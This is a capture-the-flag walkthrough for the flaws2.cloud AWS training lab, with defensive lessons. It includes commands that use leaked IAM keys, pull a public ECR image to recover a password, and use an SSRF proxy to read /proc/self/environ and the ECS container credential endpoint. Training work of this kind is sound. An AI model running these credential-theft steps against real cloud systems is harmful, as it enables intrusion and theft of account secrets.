# http://flaws2.cloud/

## Level1: http://level1.flaws2.cloud/
Check the submit request, the request will be sent to url: `https://2rfismmoo8.execute-api.us-east-1.amazonaws.com/default/level1?code=1234`

--> you'll see the access key id, secret key, token-> add this to aws cli.

--> Try to access s3 bucket: `aws --profile level1 s3 ls s3://level1.flaws2.cloud` -> http://level1.flaws2.cloud/secret-ppxVFdwV4DDtZm8vbQRvhxL8mE6wxNco.html

**Lesson learned**

Whereas EC2 instances obtain the credentials for their IAM roles from the metadata service at 169.254.169.254 (as you learned in flaws.cloud Level 5), AWS Lambda obtains those credentials from environmental variables. Often developers will dump environmental variables when error conditions occur in order to help them debug problems. This is dangerous as sensitive information can sometimes be found in environmental variables.

Another problem is the IAM role had privilieges to list the contents of a bucket which wasn't needed for its operation. Best practice is to follow a Least Privilege strategy by giving services only the minimal privileges in their IAM policies that they need to accomplish their purpose. AWS CloudTrail logs can help identify past usage (leveraged by Duo Security's CloudTracker) or AWS Access Advisor (leveraged by Netflix's RepoKid).

Finally, you shouldn't rely on input validation to happen only on the client side or at some point upstream from your code. AWS applications, especially serverless, are composed of many building blocks all chained together. Developers sometimes assume that something upstream has already performed input validation. In this case, the client data was validated by Javascript which could be bypasseed, which then passed into API Gateway and finally to the Lambda. Applications are often more complex than that, and these architectures can change over time, possibly breaking assumptions about where validation is supposed to occur.

## Level 2:
- http://level1.flaws2.cloud/secret-ppxVFdwV4DDtZm8vbQRvhxL8mE6wxNco.html
- What is ECR: https://aws.amazon.com/ecr/
- The challenge hint that it runing as a container, and we also have the ECR repository is named `level2` with public permission. So we can use the command to get list images of this container: `aws ecr list-images --repository-name level2 --profile level1 --region us-east-1`

```
{
    "imageIds": [
        {
            "imageTag": "latest", 
            "imageDigest": "sha256:513e7d8a5fb9135a61159fbfbc385a4beb5ccbd84e5755d76ce923e040f9607e"
        }
    ]
}
```

or using the command `aws ecr   describe-images --repository-name level2 --profile level1 --region us-east-1`

```
{
    "imageDetails": [
        {
            "imageSizeInBytes": 75937660, 
            "imageDigest": "sha256:513e7d8a5fb9135a61159fbfbc385a4beb5ccbd84e5755d76ce923e040f9607e", 
            "imageManifestMediaType": "application/vnd.docker.distribution.manifest.v2+json", 
            "imageTags": [
                "latest"
            ], 
            "registryId": "653711331788", 
            "repositoryName": "level2", 
            "imagePushedAt": 1543289656.0
        }
    ]
}
```
- Next get credential to login docker: `aws ecr get-login --profile level1 --region us-east-1`

- AWS docker repo format: `aws_account_id.dkr.ecr.us-west-2.amazonaws.com/repo-name:latest`
--> 653711331788.dkr.ecr.us-east-1.amazonaws.com/level2:latest
**Option 1** using docker to pull image and extract:
- `docker login`
- `docker pull 653711331788.dkr.ecr.us-east-1.amazonaws.com/level2:latest`
- `docker history 2d73de35b781 --no-trunc` -> get login, password ` /bin/sh -c htpasswd -b -c /etc/nginx/.htpasswd flaws2 secret_password `
- Bonus: `docker run -it --entrypoint sh 2d73de35b781` -> /var/www/html

**Options 2**: Using aws cli
- `aws ecr batch-get-image --repository-name level2  --image-ids imageTag=latest --region us-east-1 --profile level1`
- `aws ecr   get-download-url-for-layer --repository-name level2 --region us-east-1 --profile level1 --layer-digest sha256:2d73de35b78103fa305bd941424443d520524a050b1e0c78c488646c0f0a0621`

**Lesson learned**: 
There are lots of other resources on AWS that can be public, but they are harder to brute-force for because you have to include not only the name of the resource, but also the the Account ID and region. They also can't be searched with DNS records. However, it is still best to avoid having public resources.

You also learned a little about Docker

#$ Level 3:`http://level3-oc6ou6dnkw8sszwvdrraxc5t5udrsw3s.flaws2.cloud/`
The first hint: Containers running via ECS on AWS have their creds at 169.254.170.2/v2/credentials/GUID where the GUID is found from an environment variable AWS_CONTAINER_CREDENTIALS_RELATIVE_URI

- Using the web proxy, we can access the `proc/self/environ`, when i try to search this website in google, i also found that path, too: `http://container.target.flaws2.cloud/proxy/file:///proc/self/environ`.
- The GUID is contained in `AWS_CONTAINER_CREDENTIALS_RELATIVE_URI` variable, so the url will be: http://container.target.flaws2.cloud/proxy/http://169.254.170.2/v2/credentials/374f10ce-0ad9-49d8-8c11-52956bdbfacb 

- At here, You can see the config keys for aws cli.
- `aws s3 ls --profile level3` -> get the bucket url for the-end chall.
